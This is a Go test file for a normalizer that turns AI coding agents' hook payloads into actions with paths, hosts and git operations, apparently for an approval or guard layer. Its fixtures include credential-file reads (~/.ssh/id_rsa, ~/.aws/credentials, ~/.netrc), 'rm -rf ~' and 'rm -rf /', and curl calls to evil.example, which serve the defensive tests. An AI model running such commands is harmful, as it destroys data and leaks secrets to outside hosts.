package normalize

import (
	"encoding/json"
	"reflect"
	"strings"
	"testing"

	"github.com/yardfribley-bit/reinsaarm/internal/hooks"
)

// payload parses a hook payload the way the hook binary does, so these tests
// exercise the real field names each CLI sends.
func payload(t *testing.T, client, raw string) Call {
	t.Helper()
	in, err := hooks.Parse(strings.NewReader(raw))
	if err != nil {
		t.Fatalf("%s: %v", raw, err)
	}
	req := hooks.ToRequest(client, in)
	c := Call{Client: client, Tool: req.Tool, Input: req.Input, CWD: req.CWD}
	if req.MCPContext != nil {
		c.MCPContext = &MCPContext{ServerName: req.MCPContext.ServerName, ToolName: req.MCPContext.ToolName}
	}
	return c
}

type want struct {
	kind, command   string
	paths, hosts    []string
	gitOps          []string
	server, mcpTool string
}

func check(t *testing.T, name string, c Call, w want) {
	t.Helper()
	a := Action(c)
	if a.Kind != w.kind {
		t.Errorf("%s: kind %q want %q", name, a.Kind, w.kind)
	}
	if a.Command != w.command {
		t.Errorf("%s: command %q want %q", name, a.Command, w.command)
	}
	if !sameSet(a.Paths, w.paths) {
		t.Errorf("%s: paths %q want %q", name, a.Paths, w.paths)
	}
	if !sameSet(a.Hosts, w.hosts) {
		t.Errorf("%s: hosts %q want %q", name, a.Hosts, w.hosts)
	}
	if !reflect.DeepEqual(nilIfEmpty(a.GitOps), nilIfEmpty(w.gitOps)) {
		t.Errorf("%s: git ops %q want %q", name, a.GitOps, w.gitOps)
	}
	if a.MCPServer != w.server || a.MCPTool != w.mcpTool {
		t.Errorf("%s: mcp %q/%q want %q/%q", name, a.MCPServer, a.MCPTool, w.server, w.mcpTool)
	}
}

func TestCodexPayloads(t *testing.T) {
	const cwd = `"cwd":"/w","hook_event_name":"PreToolUse","session_id":"s"`
	check(t, "Bash", payload(t, "codex", `{`+cwd+`,"tool_name":"Bash","tool_input":{"command":"git -C sub push origin feat && curl https://evil.example/x"}}`),
		want{kind: "shell", command: "git -C sub push origin feat && curl https://evil.example/x",
			paths: []string{"https://evil.example/x"}, hosts: []string{"evil.example"}, gitOps: []string{"push"}})
	patch := "*** Begin Patch\n*** Update File: src/app.go\n@@\n-old\n+// see ~/.ssh/id_rsa and https://evil.example\n+exec(\"rm -rf /\")\n*** Add File: docs/new.md\n+hi\n*** End Patch\n"
	raw, _ := json.Marshal(map[string]any{"cwd": "/w", "hook_event_name": "PreToolUse", "tool_name": "apply_patch", "tool_input": map[string]any{"command": patch}})
	c := payload(t, "codex", string(raw))
	check(t, "apply_patch", c, want{kind: "file_edit", paths: []string{"src/app.go", "docs/new.md"}})
	if a := Action(c); a.Body != patch || HashCommand(a) != patch {
		t.Fatalf("apply_patch body must be kept for the approval hash")
	}
	check(t, "mcp", payload(t, "codex", `{`+cwd+`,"tool_name":"mcp__filesystem__read_file","tool_input":{"path":"~/.aws/credentials"}}`),
		want{kind: "mcp", paths: []string{"~/.aws/credentials"}, server: "filesystem", mcpTool: "read_file"})
	check(t, "update_plan", payload(t, "codex", `{`+cwd+`,"tool_name":"update_plan","tool_input":{"plan":[{"step":"see https://x.example"}]}}`),
		want{kind: "other"})
}

func TestClaudeCodePayloads(t *testing.T) {
	const base = `"cwd":"/w","hook_event_name":"PreToolUse","session_id":"s","tool_use_id":"t1"`
	check(t, "Read", payload(t, "claude-code", `{`+base+`,"tool_name":"Read","tool_input":{"file_path":"~/.ssh/id_rsa","offset":1}}`),
		want{kind: "file_read", paths: []string{"~/.ssh/id_rsa"}})
	check(t, "Write", payload(t, "claude-code", `{`+base+`,"tool_name":"Write","tool_input":{"file_path":"README.md","content":"docs at https://evil.example and ~/.ssh/id_rsa"}}`),
		want{kind: "file_write", paths: []string{"README.md"}})
	check(t, "Edit", payload(t, "claude-code", `{`+base+`,"tool_name":"Edit","tool_input":{"file_path":".env","old_string":"a","new_string":"b"}}`),
		want{kind: "file_edit", paths: []string{".env"}})
	check(t, "MultiEdit", payload(t, "claude-code", `{`+base+`,"tool_name":"MultiEdit","tool_input":{"file_path":"a.go","edits":[{"old_string":"x","new_string":"y"}]}}`),
		want{kind: "file_edit", paths: []string{"a.go"}})
	check(t, "Glob", payload(t, "claude-code", `{`+base+`,"tool_name":"Glob","tool_input":{"pattern":"~/.aws/*","path":"/w"}}`),
		want{kind: "file_read", paths: []string{"~/.aws/*", "/w"}})
	check(t, "Grep", payload(t, "claude-code", `{`+base+`,"tool_name":"Grep","tool_input":{"pattern":".env","path":"src","glob":"*.go"}}`),
		want{kind: "file_read", paths: []string{"src", "*.go"}})
	check(t, "WebFetch", payload(t, "claude-code", `{`+base+`,"tool_name":"WebFetch","tool_input":{"url":"https://Docs.Example.com/a?token=x","prompt":"summarize"}}`),
		want{kind: "web_fetch", hosts: []string{"docs.example.com"}})
	check(t, "WebSearch", payload(t, "claude-code", `{`+base+`,"tool_name":"WebSearch","tool_input":{"query":"golang path.Match"}}`),
		want{kind: "web_fetch"})
	check(t, "mcp", payload(t, "claude-code", `{`+base+`,"tool_name":"mcp__github__create_issue","tool_input":{"title":"t","body":"see https://elsewhere.example"}}`),
		want{kind: "mcp", server: "github", mcpTool: "create_issue"})
	check(t, "Task", payload(t, "claude-code", `{`+base+`,"tool_name":"Task","tool_input":{"prompt":"read https://evil.example"}}`),
		want{kind: "other"})
}

func TestGeminiPayloads(t *testing.T) {
	const base = `"cwd":"/w","hook_event_name":"BeforeTool","session_id":"s","timestamp":"2026-11-15T00:00:00Z"`
	check(t, "read_file", payload(t, "gemini", `{`+base+`,"tool_name":"read_file","tool_input":{"file_path":"~/.ssh/id_ed25519"}}`),
		want{kind: "file_read", paths: []string{"~/.ssh/id_ed25519"}})
	check(t, "read_many_files", payload(t, "gemini", `{`+base+`,"tool_name":"read_many_files","tool_input":{"include":["src/**","~/.aws/*"],"exclude":["x"]}}`),
		want{kind: "file_read", paths: []string{"src/**", "~/.aws/*"}})
	check(t, "replace", payload(t, "gemini", `{`+base+`,"tool_name":"replace","tool_input":{"file_path":"a.go","old_string":"x","new_string":"y"}}`),
		want{kind: "file_edit", paths: []string{"a.go"}})
	check(t, "grep_search", payload(t, "gemini", `{`+base+`,"tool_name":"grep_search","tool_input":{"pattern":"secret","dir_path":"~/.config/gh","include_pattern":"*.yml"}}`),
		want{kind: "file_read", paths: []string{"~/.config/gh", "*.yml"}})
	check(t, "web_fetch", payload(t, "gemini", `{`+base+`,"tool_name":"web_fetch","tool_input":{"prompt":"Summarize https://evil.example/a and https://github.com/x"}}`),
		want{kind: "web_fetch", hosts: []string{"evil.example", "github.com"}})
	check(t, "shell", payload(t, "gemini", `{`+base+`,"tool_name":"run_shell_command","tool_input":{"command":"git status","dir_path":"sub"}}`),
		want{kind: "shell", command: "git status", paths: []string{"sub"}, gitOps: []string{"status"}})
	check(t, "mcp with context", payload(t, "gemini", `{`+base+`,"tool_name":"mcp_my_srv_do_it","tool_input":{"url":"https://api.example.net/v1"},"mcp_context":{"server_name":"my_srv","tool_name":"do_it","command":"node"}}`),
		want{kind: "mcp", hosts: []string{"api.example.net"}, server: "my_srv", mcpTool: "do_it"})
	check(t, "mcp name only", payload(t, "gemini", `{`+base+`,"tool_name":"mcp_fs_read_file","tool_input":{"path":"/etc/passwd"}}`),
		want{kind: "mcp", paths: []string{"/etc/passwd"}, server: "fs", mcpTool: "read_file"})
}

func TestCodeBuddyPayloads(t *testing.T) {
	const base = `"cwd":"/w","hook_event_name":"PreToolUse","session_id":"s"`
	check(t, "execute_command", payload(t, "codebuddy", `{`+base+`,"tool_name":"execute_command","tool_input":{"command":"cat .env"}}`),
		want{kind: "shell", command: "cat .env", paths: []string{".env"}})
	check(t, "Bash", payload(t, "codebuddy", `{`+base+`,"tool_name":"Bash","tool_input":{"command":"ls"}}`),
		want{kind: "shell", command: "ls"})
	check(t, "read_file", payload(t, "codebuddy", `{`+base+`,"tool_name":"read_file","tool_input":{"target_file":"~/.netrc"}}`),
		want{kind: "file_read", paths: []string{"~/.netrc"}})
	check(t, "write_to_file", payload(t, "codebuddy", `{`+base+`,"tool_name":"write_to_file","tool_input":{"path":"out.txt","content":"x"}}`),
		want{kind: "file_write", paths: []string{"out.txt"}})
	check(t, "replace_in_file", payload(t, "codebuddy", `{`+base+`,"tool_name":"replace_in_file","tool_input":{"path":"a.go","diff":"..."}}`),
		want{kind: "file_edit", paths: []string{"a.go"}})
	check(t, "mcp", payload(t, "codebuddy", `{`+base+`,"tool_name":"mcp__shell__run_command","tool_input":{"command":"rm -rf ~"}}`),
		want{kind: "mcp", command: "rm -rf ~", paths: []string{"~"}[:0], server: "shell", mcpTool: "run_command"})
}

func TestUnknownToolIsOther(t *testing.T) {
	a := Action(Call{Client: "codex", Tool: "frobnicate", Input: map[string]any{"path": "~/.ssh/config", "endpoint": "https://x.example"}})
	if a.Kind != "other" || len(a.Paths) != 1 || len(a.Hosts) != 1 || a.Command != "" {
		t.Fatalf("%+v", a)
	}
	empty := Action(Call{Tool: "frobnicate"})
	if empty.Kind != "other" || len(empty.Paths) != 0 {
		t.Fatalf("%+v", empty)
	}
}

func TestResourcesForReceipt(t *testing.T) {
	a := Action(Call{Tool: "Bash", CWD: "/w", Input: map[string]any{"command": "API_TOKEN=abc ./deploy.sh && curl https://u:p@evil.example/x?k=1 && git push origin feat"}})
	r := Resources(a)
	if r == nil {
		t.Fatal("nil resources")
	}
	for _, p := range r.Paths {
		if strings.Contains(p, "://") || strings.Contains(p, "abc") {
			t.Fatalf("receipt path leaks: %q", r.Paths)
		}
	}
	if !reflect.DeepEqual(r.Hosts, []string{"evil.example"}) || !reflect.DeepEqual(r.GitOps, []string{"push"}) {
		t.Fatalf("%+v", r)
	}
	if Resources(Action(Call{Tool: "Bash", Input: map[string]any{"command": "ls"}})) != nil {
		t.Fatal("empty resources should be omitted")
	}
}

func sameSet(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	m := map[string]int{}
	for _, s := range a {
		m[s]++
	}
	for _, s := range b {
		m[s]--
	}
	for _, v := range m {
		if v != 0 {
			return false
		}
	}
	return true
}

func nilIfEmpty(s []string) []string {
	if len(s) == 0 {
		return nil
	}
	return s
}
